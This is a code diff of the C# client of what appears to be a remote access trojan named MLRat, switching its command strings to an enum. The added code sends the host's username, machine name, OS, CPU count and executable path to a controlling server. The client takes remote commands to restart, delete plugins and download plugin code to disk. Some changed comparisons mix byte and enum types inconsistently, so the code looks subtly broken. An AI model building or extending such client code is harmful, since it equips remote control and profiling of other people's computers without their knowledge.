@@ -1,4 +1,5 @@
 ﻿using MLRatClient.Networking;
+using MLRat.Networking;
 using MLRatClient.Plugin;
 using System;
 using System.Collections.Generic;
@@ -65,7 +66,7 @@ namespace MLRatClient
                         DisplayException(_plugin, ex);
                     }
                 }
-                networkClient.Send(Guid.Empty, "handshake", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName), Environment.OSVersion.ToString());
+                networkClient.Send(Guid.Empty, (byte)NetworkPacket.Handshake, string.Format("{0}/{1}", Environment.UserName, Environment.MachineName), Environment.OSVersion.ToString());
                 Console.WriteLine("handshake sent");
             }
             else
@@ -154,7 +155,7 @@ namespace MLRatClient
                     Checksums.Add(plugin.Value.ClientPluginID, plugin.Value.Checksum);
                 }
                 Console.WriteLine("Sent checksums");
-                networkClient.Send(Guid.Empty, "checksums", Checksums);
+                networkClient.Send(Guid.Empty, (byte)NetworkPacket.Checksums, Checksums);
             }
             catch(Exception ex)
             {
@@ -190,8 +191,8 @@ namespace MLRatClient
                 Guid ID = (Guid)data[0];
                 if (ID == Guid.Empty)
                 {
-                    string command = (string) data[1];
-                    if (command == "restart")
+                    var command = (NetworkPacket) data[1];
+                    if (command == (byte)NetworkPacket.Restart)
                     {
                         Console.WriteLine("Restarting...");
                         //Console.ReadLine();
@@ -199,14 +200,14 @@ namespace MLRatClient
                         Environment.Exit(0);
                     }
 
-                    if (command == "deleteplugin")
+                    if (command == NetworkPacket.DeletePlugin)
                     {
                         Guid PluginID = (Guid)data[2];
                         Console.WriteLine("Deleting plugin {0}", PluginID.ToString("n"));
                         File.Delete(Path.Combine(PluginBaseLication, string.Format("{0}.MLP", PluginID.ToString("n"))));
                     }
 
-                    if (command == "pluginupdate")
+                    if (command == NetworkPacket.UpdatePlugin)
                     {
                         Guid PluginID = (Guid) data[2];
                         byte[] Block = (byte[]) data[3];
@@ -235,7 +236,17 @@ namespace MLRatClient
                         }
                     }
 
-                    if (command == "connected")
+                    if(command == NetworkPacket.PluginsVerified)
+                    {
+                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName));
+                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "OS", Environment.OSVersion.ToString());
+                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Cores", Environment.ProcessorCount.ToString());
+                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Path", Assembly.GetExecutingAssembly().Location);
+                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.BasicSettingsUpdated);
+                    }
+
+
+                    if (command == NetworkPacket.Connect)
                     {
                         SendChecksums();
                     }
